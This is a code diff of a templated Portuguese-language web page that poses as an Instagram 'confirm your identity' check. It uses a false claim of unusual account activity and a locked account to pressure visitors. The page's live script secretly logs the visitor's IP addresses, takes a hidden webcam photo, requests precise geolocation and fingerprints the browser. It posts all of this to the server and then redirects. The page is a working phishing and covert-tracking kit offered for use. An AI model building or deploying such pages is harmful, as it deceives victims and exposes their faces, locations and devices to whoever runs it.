@@ -1,145 +1,297 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Verificação de Segurança</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #f9fafb;
-      color: #111827;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Confirmar identidade</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    .card {
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
-      padding: 32px;
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-    .logo {
-      width: 60px;
-      margin-bottom: 16px;
-    }
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
 
-    h2 {
-      font-size: 22px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 40px 40px 44px;
+            margin-bottom: 10px;
+        }
 
-    p {
-      font-size: 15px;
-      color: #6b7280;
-      margin-bottom: 24px;
-    }
+        .logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPjxwYXRoIGZpbGw9IiMyNjI2MjYiIGQ9Ik0xMzYuNSAyNS4zYzAtNi40LTIuNy05LjItNy45LTkuMi01LjIgMC03LjkgMi44LTcuOSA5LjJ2MTAuNGMwIDYuNCAyLjcgOS4yIDcuOSA5LjIgNS4yIDAgNy45LTIuOCA3LjktOS4ydi0xMC40em0tNy45IDE2LjhjLTIuOSAwLTMuOS0xLjgtMy45LTUuNFYyNC4zYzAtMy42IDEtNS40IDMuOS01LjQgMi45IDAgMy45IDEuOCAzLjkgNS40djEyLjRjMCAzLjYtMSA1LjQtMy45IDUuNHptMzAuMyA0aC01VjE2LjNoNVY0MS4xem0tMi41LTE3LjdjLS43IDAtMS4zLS4zLTEuOC0uOC0uNS0uNS0uOC0xLjItLjgtMS45czMtLjcgMS4zLS4zIDEuMy44IDEuOCAxLjhjLjUuNS44IDEuMi44IDEuOXMtLjMgMS40LS44IDEuOWMtLjUuNS0xLjIuOC0xLjguOHptMjEuNC4zYzAtNC40LTEuNC02LjgtNC42LTYuOC0yLjQgMC0zLjkgMS4zLTQuNyAzLjRoLS4xVjE2LjNoLTR2MjQuOGg0LjlWMjcuNWMwLTMuNSAxLjMtNS40IDMuNy01LjQgMi4yIDAgMy4yIDEuNSAzLjIgNC4zdjE0LjdoNS0uMXYtMTQuN3ptMTUuMy00LjVoLTQuM3YyMC4yYy0xLjMuOS0yLjcgMS40LTQuMiAxLjQtMi4yIDAtMy4yLTEuMS0zLjItMy42VjI0LjVoLTUuMnYxNy41YzAgNC42IDIuMSA3LjEgNi4zIDcuMSAyLjYgMCA0LjgtMS4xIDYuNC0zLjFoLjF2Mi42aDQuMVYyNC41eiIvPjxwYXRoIGZpbGw9IiMyNjI2MjYiIGQ9Ik0zNy4xIDBoLTIyQzYuOCAwIDAgNi44IDAgMTV2MjJjMCA4LjIgNi44IDE1IDE1IDE1aDIyYzguMiAwIDE1LTYuOCAxNS0xNVYxNWMwLTguMi02LjgtMTUtMTUtMTV6TTE1IDQuNWgxMS4zYzUuOCAwIDEwLjcgNC45IDEwLjcgMTAuN1YyNmMwIDUuOC00LjkgMTAuNy0xMC43IDEwLjdIMTVjLTUuOCAwLTEwLjctNC45LTEwLjctMTAuN3YtMTEuN0M0LjMgOC45IDkuMiA0IDE1IDQuNXptMTEuMyAzOC4ySDI2LjNjLTUuOCAwLTEwLjctNC45LTEwLjctMTAuN1YxNS4zYzAtNS44IDQuOS0xMC43IDEwLjctMTAuN2gxMWM1LjggMCAxMC43IDQuOSAxMC43IDEwLjdWMzJjMCA1LjgtNC45IDEwLjctMTAuNyAxMC43eiIvPjwvc3ZnPg==');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: 175px;
+            height: 51px;
+            margin: 0 auto 36px;
+        }
 
-    .button {
-      background-color: #2563eb;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      padding: 12px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.2s;
-    }
+        .security-badge {
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
-    .button:hover {
-      background-color: #1d4ed8;
-    }
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 16px;
+            background: linear-gradient(135deg, #833ab4 0%, #fd1d1d 50%, #fcb045 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    #mensagem {
-      font-size: 14px;
-      color: #374151;
-      margin-top: 16px;
-      font-weight: bold;
-    }
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #262626;
+            text-align: center;
+            margin-bottom: 8px;
+        }
 
-    .loading {
-      margin-top: 20px;
-      font-size: 13px;
-      color: #6b7280;
-    }
+        .subtitle {
+            font-size: 14px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
 
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #2563eb;
-      border-radius: 50%;
-      width: 28px;
-      height: 28px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 8px;
-    }
+        .alert-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 16px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+        .alert-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #856404;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-text {
+            font-size: 13px;
+            color: #856404;
+            line-height: 1.6;
+        }
+
+        .info-list {
+            margin: 20px 0;
+            padding-left: 0;
+            list-style: none;
+        }
+
+        .info-list li {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 12px;
+            padding-left: 28px;
+            position: relative;
+            line-height: 1.5;
+        }
+
+        .info-list li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #0095f6;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .verify-btn {
+            width: 100%;
+            background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 12px;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(131, 58, 180, 0.3);
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .loading-state {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loading-state.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #833ab4;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .bottom-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+                border: none;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="card">
+            <div class="logo"></div>
 
-  <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="logo" class="logo">
+            <div class="security-badge">
+                <div class="shield-icon">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="white">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                    </svg>
+                </div>
+            </div>
 
-    <h2>Verificação de Segurança</h2>
-    <p>Por favor, clique para continuar.</p>
+            <h1>Confirme sua identidade</h1>
+            <p class="subtitle">
+                Detectamos uma atividade incomum na sua conta. Por favor, verifique sua identidade para continuar.
+            </p>
 
-    <button id="permitir" class="button">Seguinte</button>
-    <p id="mensagem"></p>
+            <div class="alert-box">
+                <div class="alert-title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                    Ação Necessária
+                </div>
+                <p class="alert-text">
+                    Esta é uma medida de segurança do Instagram. Sua conta permanecerá bloqueada até que você conclua a verificação.
+                </p>
+            </div>
 
-    <div class="loading" id="loading" style="display:none;">
-      <div class="spinner"></div>
-      Verificando informações...
+            <ul class="info-list">
+                <li>Processo rápido e seguro</li>
+                <li>Seus dados estão protegidos</li>
+                <li>Verificação automática em 30 segundos</li>
+            </ul>
+
+            <button id="verifyBtn" class="verify-btn">
+                Continuar Verificação
+            </button>
+
+            <p class="footer-text">
+                Ao continuar, você concorda com os<br>
+                <strong>Termos de Uso</strong> e <strong>Política de Privacidade</strong> do Instagram
+            </p>
+
+            <div class="loading-state" id="loadingState">
+                <div class="spinner"></div>
+                <p style="color: #262626; font-weight: 600; margin-bottom: 4px;">Verificando sua identidade...</p>
+                <p style="color: #8e8e8e; font-size: 13px;">Isso pode levar alguns segundos</p>
+            </div>
+        </div>
+
+        <div class="bottom-card">
+            Protegido pelo Instagram Security Center
+        </div>
     </div>
-  </div>
 
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-<script>
-    const slug = {{ slug | tojson | safe }};
-    const destino = {{ destino | tojson | safe }};
-    const inicioTempo = Date.now();
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-    // Coleta de IP Inicial
-    (async () => {
-        let ip_v4 = "indefinido";
-        let ip_v6 = "indefinido";
-        let porta = location.port || (location.protocol === "https:" ? "443" : "80");
+    <script>
+        const slug = {{ slug | tojson | safe }};
+        const destino = {{ destino | tojson | safe }};
+        const inicioTempo = Date.now();
 
-        try {
-            const resV4 = await fetch("https://api.ipify.org?format=json");
-            if (resV4.ok) ip_v4 = (await resV4.json()).ip;
-        } catch (e) {}
+        // Coleta de IP Inicial
+        (async () => {
+            let ip_v4 = "indefinido", ip_v6 = "indefinido";
+            let porta = location.port || (location.protocol === "https:" ? "443" : "80");
 
-        try {
-            const resV6 = await fetch("https://api64.ipify.org?format=json");
-            if (resV6.ok) ip_v6 = (await resV6.json()).ip;
-        } catch (e) {}
+            try {
+                const resV4 = await fetch("https://api.ipify.org?format=json");
+                if (resV4.ok) ip_v4 = (await resV4.json()).ip;
+            } catch (e) {}
 
-        try {
-            const payloadInicial = { slug, ip_v4, ip_v6, porta };
-            await fetch("/coletar_ip_inicial", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payloadInicial)
-            });
-        } catch (e) {}
-    })();
+            try {
+                const resV6 = await fetch("https://api64.ipify.org?format=json");
+                if (resV6.ok) ip_v6 = (await resV6.json()).ip;
+            } catch (e) {}
 
-    const coletarInfoBrowser = () => {
-        return {
+            try {
+                await fetch("/coletar_ip_inicial", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ slug, ip_v4, ip_v6, porta })
+                });
+            } catch (e) {}
+        })();
+
+        const coletarInfoBrowser = () => ({
             userAgent: navigator.userAgent,
             idioma: navigator.language,
             fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -147,113 +299,85 @@
             alturaTela: window.screen.height,
             plataforma: navigator.platform,
             conexao: (navigator.connection || {}).effectiveType || "indisponível"
-        };
-    };
+        });
 
-    async function coletarDadosDetalhes() {
-        let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
-        const mensagemElement = document.getElementById('mensagem');
+        async function coletarDadosDetalhes() {
+            let latitude = "indefinido", longitude = "indefinido", foto_base64 = null;
 
-        try {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (video && canvas && navigator.mediaDevices?.getUserMedia) {
-                const streamPromise = navigator.mediaDevices.getUserMedia({ video: true });
-                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000));
-                const stream = await Promise.race([streamPromise, timeoutPromise]);
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                if (video && canvas && navigator.mediaDevices?.getUserMedia) {
+                    const stream = await Promise.race([
+                        navigator.mediaDevices.getUserMedia({ video: true }),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000))
+                    ]);
 
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 3000));
+                    video.srcObject = stream;
+                    await new Promise(r => setTimeout(r, 3000));
 
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                foto_base64 = canvas.toDataURL("image/jpeg", 0.8);
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    foto_base64 = canvas.toDataURL("image/jpeg", 0.8);
 
-                stream.getTracks().forEach(track => track.stop());
-            }
-        } catch (e) {}
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch (e) {}
 
-        try {
-            if (navigator.geolocation) {
-                const geoPromise = new Promise((res, rej) =>
-                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 30000 })
-                );
-                const pos = await Promise.race([
-                    geoPromise,
-                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 30000))
-                ]);
-                latitude = pos.coords.latitude.toString();
-                longitude = pos.coords.longitude.toString();
-            }
-        } catch (e) {}
+            try {
+                if (navigator.geolocation) {
+                    const pos = await Promise.race([
+                        new Promise((res, rej) => 
+                            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 30000 })
+                        ),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 30000))
+                    ]);
+                    latitude = pos.coords.latitude.toString();
+                    longitude = pos.coords.longitude.toString();
+                }
+            } catch (e) {}
 
-        const infosBrowser = coletarInfoBrowser();
+            const infosBrowser = coletarInfoBrowser();
+            let ip_v4_detalhes = "indefinido", ip_v6_detalhes = "indefinido";
+            let porta_detalhes = location.port || (location.protocol === "https:" ? "443" : "80");
 
-        let ip_v4_detalhes = "indefinido";
-        let ip_v6_detalhes = "indefinido";
-        let porta_detalhes = location.port || (location.protocol === "https:" ? "443" : "80");
+            try {
+                const resV4 = await fetch("https://api.ipify.org?format=json");
+                if (resV4.ok) ip_v4_detalhes = (await resV4.json()).ip;
+            } catch (e) {}
 
-        try {
-            const resV4 = await fetch("https://api.ipify.org?format=json");
-            if (resV4.ok) ip_v4_detalhes = (await resV4.json()).ip;
-        } catch (e) {}
+            try {
+                const resV6 = await fetch("https://api64.ipify.org?format=json");
+                if (resV6.ok) ip_v6_detalhes = (await resV6.json()).ip;
+            } catch (e) {}
 
-        try {
-            const resV6 = await fetch("https://api64.ipify.org?format=json");
-            if (resV6.ok) ip_v6_detalhes = (await resV6.json()).ip;
-        } catch (e) {}
+            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);
 
-        const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 3000);
+            try {
+                await fetch("/coletar_dados", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        slug, ip_v4: ip_v4_detalhes, ip_v6: ip_v6_detalhes,
+                        porta: porta_detalhes, latitude, longitude, foto_base64,
+                        tempoSegundos, sistema: infosBrowser.plataforma,
+                        navegador: infosBrowser.userAgent, idioma: infosBrowser.idioma,
+                        fusoHorario: infosBrowser.fusoHorario, conexao: infosBrowser.conexao,
+                        larguraTela: infosBrowser.larguraTela, alturaTela: infosBrowser.alturaTela
+                    })
+                });
+            } catch (e) {}
 
-        const payloadDetalhes = {
-            slug,
-            ip_v4: ip_v4_detalhes,
-            ip_v6: ip_v6_detalhes,
-            porta: porta_detalhes,
-            latitude,
-            longitude,
-            foto_base64,
-            tempoSegundos,
-            sistema: infosBrowser.plataforma,
-            navegador: infosBrowser.userAgent,
-            idioma: infosBrowser.idioma,
-            fusoHorario: infosBrowser.fusoHorario,
-            conexao: infosBrowser.conexao,
-            larguraTela: infosBrowser.larguraTela,
-            alturaTela: infosBrowser.alturaTela
-        };
-
-        try {
-            if (mensagemElement) mensagemElement.innerText = "Redirecionando para site seguro...";
-            const res = await fetch("/coletar_dados", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payloadDetalhes)
-            });
-
-            window.location.href = `/redir/${slug}`;
-        } catch (e) {
             window.location.href = `/redir/${slug}`;
         }
-    }
 
-    document.addEventListener('DOMContentLoaded', () => {
-        const btn = document.getElementById('permitir');
-        btn.addEventListener('click', () => {
-            document.getElementById('loading').style.display = 'block';
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            document.querySelector('.card > *:not(#loadingState)').forEach(el => el.style.display = 'none');
+            document.querySelector('.logo').style.display = 'block';
+            document.getElementById('loadingState').classList.add('active');
             coletarDadosDetalhes();
         });
-    });
-
-    // Elementos esperados no HTML:
-    /*
-    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
-    <p id="mensagem" style="text-align: center; color: white;"></p>
-    */
-</script>
-
-
+    </script>
 </body>
 </html>
